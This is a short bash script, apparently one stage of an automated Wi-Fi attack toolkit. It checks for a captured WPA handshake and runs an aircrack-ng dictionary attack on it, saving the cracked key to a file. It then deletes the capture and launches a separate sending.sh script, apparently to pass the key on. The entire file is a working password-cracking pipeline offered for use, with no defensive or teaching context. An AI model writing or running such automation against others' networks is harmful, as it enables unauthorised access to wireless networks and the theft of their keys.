#! /bin/bash

# aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
# check handshake
if [ -e handshake/WPA.cap ]
then
echo "Time: $(date): handshake exist"
echo "Time: $(date): handshake exist" >> logs/decryptor.log
# decrypting
aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
echo "Time: $(date): end decrypting"
echo "Time: $(date): end decrypting" >> logs/decryptor.log
# remove old handshake
rm handshake/WPA.cap
echo "Time: $(date): remove old handshake"
echo "Time: $(date): remove old handshake" >> logs/decryptor.log
# start sending
./sending.sh
echo "Time: $(date): run sending.sh"
echo "Time: $(date): run sending.sh" >> logs/decryptor.log
else
# bad result check
echo "Time: $(date): handshake doesn't exist"
echo "Time: $(date): handshake doesn't exist" >> logs/decryptor.log
fi
exit
